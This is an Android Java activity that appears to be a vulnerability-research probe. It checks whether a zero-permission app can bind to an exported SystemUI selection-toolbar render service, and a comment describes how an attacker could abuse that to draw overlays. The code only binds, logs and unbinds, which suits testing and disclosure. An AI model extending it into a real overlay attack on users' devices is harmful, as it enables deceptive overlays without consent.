package com.vrp.zeroperm;

import android.app.Activity;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.ServiceConnection;
import android.os.Bundle;
import android.os.IBinder;
import android.util.Log;

// com.android.systemui/.selectiontoolbar.app.service.SysUiSelectionToolbarRenderService2
// is exported=true with NO manifest permission, unlike its sibling
// SysUiSelectionToolbarRenderService (v1, no "2"), which correctly requires
// android.permission.BIND_SELECTION_TOOLBAR_RENDER_SERVICE. Probes whether the
// framework base class android.service.selectiontoolbar.SelectionToolbarRenderService2's
// onBind() enforces its own caller check before a zero-perm app can obtain a live
// binder capable of calling onShow()/onSelectText()/etc, which take an
// attacker-controlled hostUid int and could let a zero-perm app trigger SystemUI to
// render an attacker-controlled floating selection-toolbar overlay with no
// SYSTEM_ALERT_WINDOW permission.
public class SelectionToolbarV2ProbeActivity extends Activity {
    private static final String T = "SELTOOLBAR_V2_PROBE";

    @Override
    protected void onCreate(Bundle b) {
        super.onCreate(b);
        Log.w(T, "=== SysUiSelectionToolbarRenderService2 zero-permission bind probe ===");
        Log.w(T, "UID=" + android.os.Process.myUid() + " (ZERO permissions)");

        tryBind("android.service.selectiontoolbar.SelectionToolbarRenderService");
    }

    private void tryBind(String action) {
        Intent intent = new Intent(action);
        intent.setComponent(new ComponentName(
            "com.android.systemui",
            "com.android.systemui.selectiontoolbar.app.service.SysUiSelectionToolbarRenderService2"));

        ServiceConnection conn = new ServiceConnection() {
            @Override
            public void onServiceConnected(ComponentName name, IBinder service) {
                Log.w(T, "[!!!] BOUND with ZERO permissions: " + name + " binder=" + service);
                try {
                    Log.w(T, "  interface desc=" + service.getInterfaceDescriptor());
                } catch (Exception e) {
                    Log.w(T, "  desc error: " + e);
                }
                try { unbindService(this); } catch (Exception e) {}
            }

            @Override
            public void onServiceDisconnected(ComponentName name) {
                Log.w(T, "[x] Disconnected");
            }
        };

        try {
            boolean bound = bindService(intent, conn, Context.BIND_AUTO_CREATE);
            Log.w(T, "bindService(action=" + action + ") returned " + bound);
        } catch (SecurityException se) {
            Log.w(T, "[-] bindService SecurityException: " + se.getMessage());
        } catch (Exception e) {
            Log.w(T, "[-] bindService exception: " + e);
        }
    }
}
